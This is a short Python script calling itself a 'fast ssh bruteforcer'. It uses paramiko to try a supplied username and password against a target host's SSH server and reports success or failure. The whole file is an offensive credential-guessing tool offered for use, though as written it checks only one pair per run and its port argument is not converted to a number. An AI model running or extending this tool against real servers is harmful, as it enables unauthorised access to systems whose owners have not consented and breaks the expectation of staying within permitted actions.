import paramiko
import socket
import time
import argparse

def bruteforce(hostname, username, password,port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname = hostname, port = port,username = username, password = password, timeout = 5)
    except socket.timeout:
        print("[+] host unreacheable")
        return
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("[-] Can't connect to ssh server")
        return
    except paramiko.ssh_exception.PasswordRequiredException:
        print("[-] Provide Credential")
        return
    except paramiko.AuthenticationException:
        print(f"[!] Failed -> {username}:{password}")
        return
    except paramiko.SSHException:
        print("[-] ssh error")
    else:
        print(f"[+] Success -> {username}:{password}")


def main():
    parser = argparse.ArgumentParser(description="pysshbrute fast ssh bruteforcer")
    parser.add_argument("host", help="Ip address or hostname of the target ssh server")
    parser.add_argument("--port", "--port",default=22, help="port onwhich ssh server is running, it is port 22 by default")
    parser.add_argument("-u", "--user", help="username of the target ssh server")
    parser.add_argument("-p", "--password", help="password of the target ssh server")

    args = parser.parse_args()
    host = args.host
    user = args.user
    port = args.port
    password = args.password
    
    bruteforce(host, user, password, port = port)

if __name__== '__main__':
    main()
